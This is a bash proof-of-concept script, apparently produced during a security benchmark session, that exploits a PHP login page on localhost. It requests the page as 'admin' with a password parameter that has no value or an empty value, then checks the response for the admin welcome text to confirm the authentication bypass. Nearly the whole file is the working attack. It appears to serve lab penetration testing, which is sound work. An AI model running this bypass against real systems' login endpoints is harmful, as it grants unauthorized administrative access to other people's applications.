#!/bin/bash
# POC: Authentication bypass via missing parameter value (null/undefined password) - exploits PHP's handling of parameters without values
# Target: ./repo
# Created: 2025-11-07T18:34:03.131Z
# Session: benchmark-XBEN-055-24-mhp6srme

# POC for Authentication Bypass via Missing Parameter Value (NULL/Undefined Password)
# This demonstrates exploitation of PHP's parameter parsing when a parameter is present
# in the query string but without an equals sign or value (e.g., &password instead of &password=)

TARGET="http://localhost:3000/index.php"

echo "[*] Authentication Bypass POC - NULL/Undefined Parameter Value"
echo "[*] Target: $TARGET"
echo ""

# Test 1: No parameter value (parameter present without equals sign)
echo "[Test 1] Attempting bypass with &password (no equals sign, NULL value)..."
RESPONSE=$(curl -s -w "\n%{http_code}\n%{size_download}" "$TARGET?username=admin&password")
HTTP_CODE=$(echo "$RESPONSE" | tail -2 | head -1)
RESPONSE_SIZE=$(echo "$RESPONSE" | tail -1)
RESPONSE_BODY=$(echo "$RESPONSE" | head -n -2)

echo "HTTP Status: $HTTP_CODE"
echo "Response Size: $RESPONSE_SIZE bytes"

if echo "$RESPONSE_BODY" | grep -q "Welcome Admin"; then
    echo "[✓] VULNERABLE: Received 'Welcome Admin' message - Authentication bypassed!"
    echo "[✓] Admin access granted with NULL password parameter"
    EXIT_CODE=0
else
    echo "[✗] FAILED: Did not receive admin content"
    echo "Response preview: $(echo "$RESPONSE_BODY" | head -c 200)"
    EXIT_CODE=1
fi

echo ""
echo "[Test 2] Comparing with empty string parameter (&password=)..."
RESPONSE2=$(curl -s -w "\n%{http_code}" "$TARGET?username=admin&password=")
HTTP_CODE2=$(echo "$RESPONSE2" | tail -1)
RESPONSE_BODY2=$(echo "$RESPONSE2" | head -n -1)

if echo "$RESPONSE_BODY2" | grep -q "Welcome Admin"; then
    echo "[✓] Empty string also bypasses (confirms poor validation)"
else
    echo "[✗] Empty string does not bypass"
fi

echo ""
echo "[Test 3] Comparing with invalid password (should fail)..."
RESPONSE3=$(curl -s "$TARGET?username=admin&password=anyvalue")
if echo "$RESPONSE3" | grep -q "not the admin\|Invalid\|Failed\|Error" || ! echo "$RESPONSE3" | grep -q "Welcome Admin"; then
    echo "[✓] Invalid password correctly rejected"
else
    echo "[✗] Invalid password also accepted"
fi

exit $EXIT_CODE